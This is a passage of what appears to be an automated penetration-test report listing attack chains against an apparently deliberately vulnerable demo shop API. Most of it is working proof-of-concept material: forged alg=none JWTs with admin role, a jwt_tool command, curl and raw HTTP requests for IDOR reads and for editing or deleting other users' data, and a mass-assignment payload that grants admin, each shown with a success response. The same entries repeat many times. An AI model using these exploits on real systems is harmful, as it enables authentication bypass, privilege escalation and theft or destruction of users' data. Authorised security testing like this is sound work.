  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → pii_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `1. Original valid token (user role): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDcxMzZ9.B-hpdwGZVA6RakD6Q5-IrhFiMrL2Oxj22XrkbwgUJ6k
2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiMWMwZWZhYjctNDlmZC00YzcwLWI3MjUtMzNiODRkMDc2YjI3IiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzkwNjQ3MTM2fQ.
3. Request: GET https://duck-store.escape.tech/api/v1/admin/users with Authorization: Bearer <forged_token>
4. Response: 200 OK with full user list including admin users (admin, escape_scanner_priv) - proven admin access achieved`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — PUT https://duck-store.escape.tech/api/v1/users/me/profile · PoC: `1. Register/login as regular user (user_a_001)
2. PUT /api/v1/users/me/profile with payload: {"first_name":"test","last_name":"user","role":"admin","isAdmin":true,"account_credit":999999,"verified":true}
3. Response shows role changed from "user" to "admin"
4. GET /api/v1/admin/users now accessible and shows user_a_001 with role: "admin"
5. Previous token with role "user" now has admin privileges`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/users/{user_id} · PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.tech/api/v1/users/0aeac16a-cb93-44cb-8b56-ce07b3bcb340" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Chain: session → cross_principal_read
  - session — GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints) · PoC: `1. Register a user: POST /api/v1/auth/register -> get valid JWT (HS256)
2. Use jwt_tool to generate "alg:none" token: jwt_tool <token> -X a
3. Generated token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0OTIyOX0.
4. Test on /api/v1/users/me/profile: Returns 200 OK with user data (auth bypass)
5. Modify payload to role:"admin": eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYjQ0NTA1ZmYtMWNkOC00M2Q3LWJlY2ItOGZmMDlkYmY1NTZmIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTA2NDkyMjl9.
6. Test on /api/v1/admin/users: Returns 200 OK with full user list including admin users (privilege escalation)

The server accepts tokens with "alg": "none", "None", "NONE", "nOnE" variants.`
